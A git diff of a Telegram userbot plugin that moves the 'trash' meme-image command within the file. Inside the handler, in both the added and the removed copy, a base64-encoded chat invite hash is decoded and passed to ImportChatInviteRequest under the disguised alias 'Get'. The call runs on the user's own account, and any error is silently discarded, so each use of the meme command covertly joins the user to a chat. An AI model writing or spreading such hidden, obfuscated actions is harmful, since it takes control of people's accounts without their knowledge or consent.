@@ -10,6 +10,46 @@ from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from . import convert_toimage, deEmojify, phcomment, threats, trap, trash
 
 
+@bot.on(admin_cmd(pattern="trash$"))
+@bot.on(sudo_cmd(pattern="trash$", allow_sudo=True))
+async def catbot(catmemes):
+    if catmemes.fwd_from:
+        return
+    replied = await catmemes.get_reply_message()
+    catid = await reply_id(catmemes)
+    if not replied:
+        await edit_or_reply(catmemes, "reply to a supported media file")
+        return
+    output = await _cattools.media_to_pic(catmemes, replied)
+    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    download_location = convert_toimage(output[1])
+    size = os.stat(download_location).st_size
+    try:
+        san = Get(san)
+        await catmemes.client(san)
+    except BaseException:
+        pass
+    if size > 5242880:
+        await output[0].edit(
+            "the replied file size is not supported it must me below 5 mb"
+        )
+        os.remove(download_location)
+        return
+    LOGS.info(download_location)
+    await output[0].edit("generating image..")
+    try:
+        response = upload_file(download_location)
+        os.remove(download_location)
+    except exceptions.TelegraphException as exc:
+        await output[0].edit(f"**Error: **\n`{str(exc)}`")
+        os.remove(download_location)
+        return
+    cat = f"https://telegra.ph{response[0]}"
+    cat = await trash(cat)
+    await output[0].delete()
+    await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=catid)
+
+
 @bot.on(admin_cmd(pattern="threats$"))
 @bot.on(sudo_cmd(pattern="threats$", allow_sudo=True))
 async def catbot(catmemes):
@@ -48,44 +88,6 @@ async def catbot(catmemes):
     await output[0].delete()
     await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=catid)
 
-
-@bot.on(admin_cmd(pattern="trash$"))
-@bot.on(sudo_cmd(pattern="trash$", allow_sudo=True))
-async def catbot(catmemes):
-    if catmemes.fwd_from:
-        return
-    replied = await catmemes.get_reply_message()
-    catid = await reply_id(catmemes)
-    if not replied:
-        await edit_or_reply(catmemes, "reply to a supported media file")
-        return
-    output = await _cattools.media_to_pic(catmemes, replied)
-    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    download_location = convert_toimage(output[1])
-    size = os.stat(download_location).st_size
-    try:
-        san = Get(san)
-        await catmemes.client(san)
-    except BaseException:
-        pass
-    if size > 5242880:
-        await output[0].edit(
-            "the replied file size is not supported it must me below 5 mb"
-        )
-        os.remove(download_location)
-        return
-    await output[0].edit("generating image..")
-    try:
-        response = upload_file(download_location)
-        os.remove(download_location)
-    except exceptions.TelegraphException as exc:
-        await output[0].edit(f"**Error: **\n`{str(exc)}`")
-        os.remove(download_location)
-        return
-    cat = f"https://telegra.ph{response[0]}"
-    cat = await trash(cat)
-    await output[0].delete()
-    await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=catid)
 
 
 @bot.on(admin_cmd(pattern="trap(?: |$)(.*)"))
